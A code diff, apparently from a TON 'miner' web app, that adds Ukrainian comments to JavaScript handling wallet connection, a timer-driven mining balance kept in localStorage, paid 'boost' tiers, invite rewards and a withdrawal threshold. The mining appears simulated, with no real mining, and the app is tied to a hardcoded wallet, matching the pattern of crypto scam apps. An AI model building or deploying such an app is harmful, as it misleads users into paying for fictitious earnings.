@@ -1,7 +1,9 @@
+// TonConnect UI
 const tonConnectUI = new TonConnectUI({
     manifestUrl: "https://denus888.github.io/Ton-Miner/tonconnect-manifest.json"
 });
 
+// ==== Ваш TON гаманець ====
 const walletAddress = "UQDfIScKOZ4uOyayFZgYsRYX1iWUIQn7Yi0kbPirBoGsLIXW";
 
 let balance = parseFloat(localStorage.getItem("balance")) || 0;
@@ -10,18 +12,19 @@ let miningSpeed = parseFloat(localStorage.getItem("miningSpeed")) || 0.000001;
 let minDeposit = 1;
 let miningInterval = null;
 
+// ==== Оновлення балансу UI ====
 function updateBalanceUI(){
     document.getElementById("balance").innerText = balance.toFixed(6);
 }
 
-// Підключення гаманець
+// ==== Підключення гаманець ====
 tonConnectUI.onStatusChange(wallet=>{
     if(wallet){
         console.log("Wallet connected:", wallet.account.address);
     }
 });
 
-// Майнінг без питань
+// ==== Майнінг без підтверджень ====
 function startMining(){
     if(mining) return;
     mining = true;
@@ -33,21 +36,21 @@ function startMining(){
     },1000);
 }
 
-// Boost 1/5/15 TON
+// ==== Boost 1/5/15 TON ====
 function buyBoost(amount){
     let increment = amount===1?0.000001929:amount===5?0.000005787:0.0000173611;
     miningSpeed += increment;
     localStorage.setItem("miningSpeed",miningSpeed);
 }
 
-// Invite
+// ==== Invite ====
 function inviteFriends(){
     balance += 0.01;
     localStorage.setItem("balance",balance);
     updateBalanceUI();
 }
 
-// Withdraw
+// ==== Withdraw ====
 async function withdraw(){
     if(balance < minDeposit) return;
     try{
